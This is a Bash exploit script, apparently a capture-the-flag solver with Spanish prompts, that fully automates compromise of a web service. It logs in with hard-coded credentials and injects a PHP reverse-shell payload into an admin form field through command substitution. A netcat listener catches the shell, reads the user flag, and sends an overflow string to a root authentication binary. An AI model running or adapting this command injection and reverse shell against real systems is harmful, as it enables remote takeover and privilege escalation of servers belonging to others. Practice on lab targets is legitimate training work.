#!/bin/bash

read -p "[+] Introduce la IP del servicio web: " IP;
read -p "[+] Introduce el puerto: " PORT;

if [ -z "$IP" ]; then
    IP="127.0.0.1"
fi
if [ -z "$PORT" ]; then
    PORT="8080"
fi

URL="http://$IP:$PORT"
REVERSE_IP=$(hostname -I | awk '{printf $1}')
REVERSE_PORT="4444"

{
    echo "cd /home/www-data"
    echo "cat user.txt"
    echo "echo '111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'| ./rootAuth"
    echo "exit"
} | nc -lvp $REVERSE_PORT > output.txt 2>&1 &

curl -c cookies.txt -d "username=monre&password=bluemonkey" -X POST "$URL/login.php" 

PAYLOAD="\$(php -r '\$sock=fsockopen(\"$REVERSE_IP\",$REVERSE_PORT);exec(\"/bin/sh -i <%263 >%263 2>%263\");')"
curl -s -b cookies.txt -d "username=johndoe&email=johndoe@example.com&phone=1234567890&address=123 Elm Street, Springfield $PAYLOAD&password=securepassword&submit=Save+New+User" -X POST "$URL/admin.php" &>/dev/null

echo;
echo "[+] Flag de usuario: $(cat output.txt | grep 'ssi' | awk 'NR==1' | awk '{printf $NF}')"
echo "[+] Flag de root: $(cat output.txt | grep 'ssi' | awk 'NR==2' | awk '{printf $NF}')"